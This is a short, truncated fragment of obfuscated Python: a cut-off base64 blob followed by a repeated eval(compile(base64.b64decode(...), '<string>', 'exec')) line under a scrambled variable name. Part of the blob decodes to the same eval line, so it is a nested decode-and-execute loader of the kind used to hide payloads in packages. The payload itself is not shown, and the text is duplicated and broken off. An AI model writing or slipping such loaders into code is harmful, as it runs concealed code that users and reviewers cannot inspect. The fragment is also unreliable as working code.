VhM0FpQ21WMllXd29ZMjl0Y0dsc1pTaGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHOVBUekJ2YjI5UFR5a3NJQ0k4YzNSeWFXNW5QaUlzSUNkbGVHVmpKeWtwIgpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShvT08wb29vT08pLCAiPHN0cmluZz4iLCAnZXhlYycpKQ=="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))